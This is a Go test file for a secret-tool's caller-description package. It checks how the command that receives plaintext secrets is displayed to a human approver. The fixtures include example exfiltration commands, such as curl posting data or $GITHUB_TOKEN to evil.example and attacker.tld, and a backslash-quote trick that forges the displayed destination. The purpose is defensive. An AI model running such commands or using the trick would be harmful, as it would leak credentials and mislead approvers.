package caller_test

import (
	"strings"
	"testing"

	"github.com/bestdan/opx/internal/caller"
)

func TestName_NonEmpty(t *testing.T) {
	name := caller.Name()
	if name == "" {
		t.Error("caller.Name() returned empty string, want a process name")
	}
}

func TestName_NoSlash(t *testing.T) {
	// The returned name must be a plain executable name, not a path.
	name := caller.Name()
	if strings.Contains(name, "/") {
		t.Errorf("caller.Name() = %q, must not contain a path separator", name)
	}
}

func TestDescribe_NonEmpty(t *testing.T) {
	desc := caller.Describe()
	if desc == "" {
		t.Error("caller.Describe() returned empty string, want a label")
	}
}

func TestIsUninteresting(t *testing.T) {
	cases := []struct {
		comm string
		want bool
	}{
		{"sh", true},
		{"bash", true},
		{"zsh", true},
		{"fish", true},
		{"dash", true},
		{"ksh", true},
		{"csh", true},
		{"tcsh", true},
		{"login", true},
		{"ghostty", true},
		{"iterm2", true},
		{"iterm", true},
		{"Terminal", true},
		{"alacritty", true},
		{"kitty", true},
		{"wezterm", true},
		{"wezterm-gui", true},
		{"warp", true},
		{"warpterminal", true},
		{"hyper", true},
		{"tmux", true},
		{"tmux: server", true},
		{"tmux: client", true},
		{"screen", true},
		{"konsole", true},
		{"gnome-terminal", true},
		{"xterm", true},
		{"urxvt", true},
		{"st", true},
		{"foot", true},
		{"code", true},
		{"cursor", true},
		{"windsurf", true},
		{"python3", false},
		{"node", false},
		{"claude", false},
		{"", false},
	}
	for _, tc := range cases {
		t.Run(tc.comm, func(t *testing.T) {
			if got := caller.IsUninterestingForTest(tc.comm); got != tc.want {
				t.Errorf("IsUninterestingForTest(%q) = %v, want %v", tc.comm, got, tc.want)
			}
		})
	}
}

func TestIsUninteresting_CaseInsensitive(t *testing.T) {
	cases := []string{"GHOSTTY", "iTerm2", "ITERM2", "TERMINAL", "Alacritty", "KITTY", "Tmux", "CODE"}
	for _, comm := range cases {
		t.Run(comm, func(t *testing.T) {
			if !caller.IsUninterestingForTest(comm) {
				t.Errorf("IsUninterestingForTest(%q) = false, want true (case-insensitive match)", comm)
			}
		})
	}
}

func TestRenderArgv(t *testing.T) {
	cases := []struct {
		name string
		argv []string
		want string
	}{
		{
			name: "basename argv0 only",
			argv: []string{"/usr/bin/python3"},
			want: "python3",
		},
		{
			name: "path args shortened",
			argv: []string{"/usr/bin/python3", "/home/user/linear-archive.py", "--team", "PreThink"},
			want: "python3 linear-archive.py --team PreThink",
		},
		{
			name: "non-path args kept as-is",
			argv: []string{"node", "--flag", "value"},
			want: "node --flag value",
		},
		{
			name: "single arg no path",
			argv: []string{"claude"},
			want: "claude",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := caller.RenderArgvForTest(tc.argv); got != tc.want {
				t.Errorf("RenderArgvForTest(%v) = %q, want %q", tc.argv, got, tc.want)
			}
		})
	}
}

func TestDescribeArgv_SingleTokenNoPrefix(t *testing.T) {
	// A single-token argv (no arguments) has nothing to describe beyond the
	// name the dialog header already shows, so no ancestor prefix should be
	// added even when an interesting ancestor is present above it.
	got := caller.DescribeArgvForTest([]string{"claude"}, []string{"ghostty", "login-wrapper"})
	if got != "claude" {
		t.Errorf("DescribeArgvForTest with single-token argv = %q, want %q (no ancestor prefix)", got, "claude")
	}
}

func TestDescribeArgv_MultiTokenGetsPrefix(t *testing.T) {
	got := caller.DescribeArgvForTest(
		[]string{"/usr/bin/python3", "/home/user/linear-archive.py", "--team", "PreThink"},
		[]string{"ghostty", "claude"},
	)
	want := "claude › python3 linear-archive.py --team PreThink"
	if got != want {
		t.Errorf("DescribeArgvForTest = %q, want %q", got, want)
	}
}

func TestDescribeArgv_SkipsUninterestingAncestors(t *testing.T) {
	got := caller.DescribeArgvForTest(
		[]string{"node", "--flag"},
		[]string{"ghostty", "tmux", "bash"},
	)
	want := "node --flag"
	if got != want {
		t.Errorf("DescribeArgvForTest = %q, want %q (all ancestors uninteresting)", got, want)
	}
}

// TestRenderCommand pins the run-mode contract: this line is the only place
// the user learns which process receives the plaintext secrets, so it keeps
// every part of the destination. The previous behaviour — basename argv[0]
// and every path-looking argument — is the vulnerability, not a baseline.
func TestRenderCommand(t *testing.T) {
	cases := []struct {
		name string
		argv []string
		want string
	}{
		{
			name: "keeps the full path of the binary and its arguments",
			argv: []string{"/usr/bin/python3", "/home/user/linear-archive.py", "--team", "PreThink"},
			want: "/usr/bin/python3 /home/user/linear-archive.py --team PreThink",
		},
		{
			name: "keeps an attacker-controlled binary path visible",
			argv: []string{"/tmp/.cache/pytest"},
			want: "/tmp/.cache/pytest",
		},
		{
			name: "keeps the exfiltration host visible",
			argv: []string{"curl", "-d", "@-", "https://attacker.tld/collect"},
			want: "curl -d @- https://attacker.tld/collect",
		},
		{
			name: "keeps a sh -c payload whole and quoted as one argument",
			argv: []string{"sh", "-c", `curl -sd "$GITHUB_TOKEN" https://evil.example/x`},
			want: `sh -c "curl -sd \"$GITHUB_TOKEN\" https://evil.example/x"`,
		},
		{
			name: "quotes an empty argument so it is not invisible",
			argv: []string{"cmd", "", "next"},
			want: `cmd "" next`,
		},
		{
			name: "escapes a backslash so it cannot forge a closing quote",
			argv: []string{"curl", "-d", "@secrets", `https://evil.example/\" https://api.github.com/upload`},
			want: `curl -d @secrets "https://evil.example/\\\" https://api.github.com/upload"`,
		},
		{
			name: "a backslash alone is enough to require quoting",
			argv: []string{"cmd", `a\b`},
			want: `cmd "a\\b"`,
		},
		{
			name: "empty argv renders empty",
			argv: nil,
			want: "",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := caller.RenderCommand(tc.argv); got != tc.want {
				t.Errorf("RenderCommand(%v) =\n%q\nwant\n%q", tc.argv, got, tc.want)
			}
		})
	}
}

// TestRenderCommand_QuotingIsUnambiguous states the property the exact-match
// cases above only imply: an attacker-supplied argument cannot close its own
// display quote early. Escaping `"` while leaving `\` alone rendered
// `https://evil.example/\" …` as `…/\\" …`, where the `\\` reads as an escaped
// backslash and the `"` behind it as the terminator — the approver sees the
// argument end at evil.example and the next token, api.github.com, as the
// destination. It is not; the child receives one argument pointing at
// evil.example.
//
// Counting terminators rather than comparing bytes is deliberate: any future
// escaping scheme that keeps boundaries honest passes, and any that reopens
// this hole fails, whatever it renders.
func TestRenderCommand_QuotingIsUnambiguous(t *testing.T) {
	argv := []string{"curl", "-d", "@secrets", `https://evil.example/\" https://api.github.com/upload`}

	got := caller.RenderCommand(argv)

	if n := countUnescapedQuotes(got); n != 2 {
		t.Errorf("rendered argument must have exactly one opening and one closing quote, found %d in %q", n, got)
	}
	if !strings.Contains(got, "https://evil.example/") || !strings.Contains(got, "https://api.github.com/upload") {
		t.Errorf("both halves of the argument must still be legible; got %q", got)
	}
}

// countUnescapedQuotes counts the double quotes in s that a reader would treat
// as quote delimiters — i.e. those not preceded by an odd number of
// backslashes.
func countUnescapedQuotes(s string) int {
	n, backslashes := 0, 0
	for _, r := range s {
		switch r {
		case '\\':
			backslashes++
		case '"':
			if backslashes%2 == 0 {
				n++
			}
			backslashes = 0
		default:
			backslashes = 0
		}
	}
	return n
}

// TestRenderCommand_ElisionIsExplicit covers F10: a bare trailing "…" reads as
// cosmetic, so an approver cannot tell that arguments were dropped. The count
// must be present and correct.
func TestRenderCommand_ElisionIsExplicit(t *testing.T) {
	max := caller.MaxChildCommandForTest()
	argv := []string{"deploy.sh", strings.Repeat("a", max-20), "--dropped-one", "--dropped-two"}

	got := caller.RenderCommand(argv)

	if !strings.Contains(got, "+2 more arguments") {
		t.Errorf("elision must name how many arguments were dropped; got %q", got)
	}
	if strings.HasSuffix(got, "…") {
		t.Errorf("elision must not be a bare ellipsis; got %q", got)
	}
	if strings.Contains(got, "--dropped-two") {
		t.Errorf("argument past the budget should not have been rendered; got %q", got)
	}

	// Singular reads correctly too — an off-by-one in the count is exactly the
	// kind of detail an approver would (rightly) stop trusting.
	one := caller.RenderCommand([]string{"deploy.sh", strings.Repeat("a", max-20), "--only-dropped"})
	if !strings.Contains(one, "+1 more argument") || strings.Contains(one, "+1 more arguments") {
		t.Errorf("singular elision phrasing wrong; got %q", one)
	}
}

// TestRenderCommand_NeverTruncatesArgv0 keeps the most decision-relevant
// token whole: a path long enough to blow the budget is precisely the one
// worth reading.
func TestRenderCommand_NeverTruncatesArgv0(t *testing.T) {
	max := caller.MaxChildCommandForTest()
	long := "/tmp/" + strings.Repeat("d/", max) + "evil"
	argv := []string{long, "--flag"}

	got := caller.RenderCommand(argv)

	if !strings.HasPrefix(got, long) {
		t.Errorf("argv[0] must render in full; got %q", got)
	}
	if !strings.Contains(got, "+1 more argument") {
		t.Errorf("dropped arguments must still be counted; got %q", got)
	}
}

// TestRenderCommand_AncestorRenderingUnchanged guards the split: the ancestor
// path keeps its basename shortening, and the two must not be reunified.
func TestRenderCommand_AncestorRenderingUnchanged(t *testing.T) {
	argv := []string{"/usr/bin/python3", "/home/user/script.py", "--flag"}

	ancestor := caller.RenderArgvForTest(argv)
	if ancestor != "python3 script.py --flag" {
		t.Errorf("ancestor rendering changed: %q", ancestor)
	}
	if child := caller.RenderCommand(argv); child == ancestor {
		t.Errorf("child and ancestor renderings must differ; both = %q", child)
	}
}

func TestTruncate(t *testing.T) {
	cases := []struct {
		name string
		s    string
		n    int
		want string
	}{
		{"under limit unchanged", "short string", 120, "short string"},
		{"exact limit unchanged", strings.Repeat("a", 120), 120, strings.Repeat("a", 120)},
		{"over limit cut with ellipsis", strings.Repeat("a", 130), 120, strings.Repeat("a", 119) + "…"},
		{"empty string", "", 120, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := caller.TruncateForTest(tc.s, tc.n)
			if got != tc.want {
				t.Errorf("TruncateForTest(%q, %d) = %q, want %q", tc.s, tc.n, got, tc.want)
			}
			if n := len([]rune(got)); n > tc.n {
				t.Errorf("TruncateForTest result has %d runes, want <= %d", n, tc.n)
			}
		})
	}
}
